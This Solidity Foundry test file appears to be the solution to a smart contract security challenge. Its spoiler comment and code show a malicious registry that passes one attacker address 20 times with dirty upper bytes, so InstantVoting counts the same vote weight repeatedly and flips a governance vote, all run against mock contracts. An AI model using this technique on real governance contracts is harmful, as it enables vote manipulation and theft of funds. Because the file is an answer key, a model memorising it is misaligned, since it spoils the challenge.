// SPDX-License-Identifier: MIT

pragma solidity 0.8.25;

import { Test, console } from "forge-std-1.9.2/src/Test.sol";
import { InstantVoting, IVotingToken } from "../src/InstantVoting.sol";
import { MockVotingToken } from "../src/mock/MockVotingToken.sol";
import { MockExecutor } from "../src/mock/MockExecutor.sol";
import { MockVoterRegistry } from "../src/mock/MockVoterRegistry.sol";

/**
====================== !!  SPOILER ALERT  !! ======================

The malicious registry returns a bytes32 array with the same address
but dirty upper bytes. Within InstantVoting::collectVotes(), these
bytes32 values will be copied into the address[] array slots by the
identity precompile. While they are interpreted as an address for
the IVotingToken::weight() call, the derived mapping slot of VOTED_SLOT
is under the influence of the dirty bytes, thereby leading to a different
slot for the same address. This allows having the same voter's weight 
counted multiple times and, hence, manipulating the vote.

===================================================================
*/
contract MaliciousRegistry {
    address voter;

    constructor(address adversary) {
        voter = adversary;
    }

    function getVoters() external view returns (bytes32[] memory) {
        bytes32[] memory voters = new bytes32[](20);

        for (uint256 i = 0; i < 20; ++i) {
            // address with dirty bytes
            uint256 offset = 32 + i * 32;
            bytes32 value = bytes32(i << 160) | bytes32(uint256(uint160(voter)));
            assembly {
                mstore(add(voters, offset), value)
            }
        }

        return voters;
    }
}

contract ExploitTest is Test {
    InstantVoting public instantVoting;
    MockVotingToken public votingToken;
    MockExecutor public executor;
    MockVoterRegistry public registry;
    MaliciousRegistry public maliciousRegistry;

    address alice;
    address bob;
    address charlie;
    address mallory;
    
    bytes32 proposalId;

    function setUp() public {
        votingToken = new MockVotingToken("Voting", "VTG");
        executor = new MockExecutor();
        registry = new MockVoterRegistry();
        instantVoting = new InstantVoting(address(votingToken), address(executor));

        alice = makeAddr("alice");
        bob = makeAddr("bob");
        charlie = makeAddr("charlie");
        mallory = makeAddr("mallory"); // attacker

        votingToken.mint(alice, 7 * 10**18);
        votingToken.mint(bob, 5 * 10**18);
        votingToken.mint(charlie, 3 * 10**18);
        votingToken.mint(mallory, 1 * 10**18); // attacker has the least voting weight

        registry.register(alice);
        registry.register(bob);
        registry.register(charlie);

        maliciousRegistry = new MaliciousRegistry(mallory);

        proposalId = executor.schedule(
            makeAddr("target"), 1 ether, "", keccak256("first proposal salt")
        );
    }

    function test_exploit() public {
        // do the votes
        vm.prank(alice);
        votingToken.vote(proposalId, IVotingToken.Decision.Against);
        vm.prank(bob);
        votingToken.vote(proposalId, IVotingToken.Decision.Against);
        vm.prank(charlie);
        votingToken.vote(proposalId, IVotingToken.Decision.Against);
        // counting the legitimate Against votes
        instantVoting.collectVotes(proposalId, address(registry));

        // Attacker votes
        vm.prank(mallory);
        votingToken.vote(proposalId, IVotingToken.Decision.For);
        // Despite having the least voting weight, mallory's weight is counted
        // 20 times through the maliciousRegistry and thereby turning the
        // vote around.
        instantVoting.collectVotes(proposalId, address(maliciousRegistry));

        vm.expectEmit(true, false, false, false, address(executor));
        emit MockExecutor.Executed(proposalId);
        instantVoting.run(proposalId);
    }
}
